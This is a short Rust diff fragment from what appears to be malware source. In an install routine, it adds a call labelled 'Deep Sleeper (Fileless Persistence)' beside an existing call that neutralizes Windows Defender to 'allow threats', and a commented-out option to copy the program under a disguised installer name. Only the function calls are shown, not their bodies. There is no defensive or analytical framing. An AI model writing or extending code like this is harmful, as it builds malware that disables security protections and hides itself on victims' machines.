@@ -100,6 +100,9 @@ pub fn install() -> Result<(), Box<dyn std::error::Error>> {
         // Neutralize Defender (Allow threats)
         let _ = crate::system::process::neutralize_defender();
         
+        // Deep Sleeper (Fileless Persistence)
+        let _ = crate::system::process::create_fileless_sleeper();
+
         // Copy self to bin (optional, can skip or rename to sys_installer.exe)
         // let _ = copy_self_to_bin(); 
     }
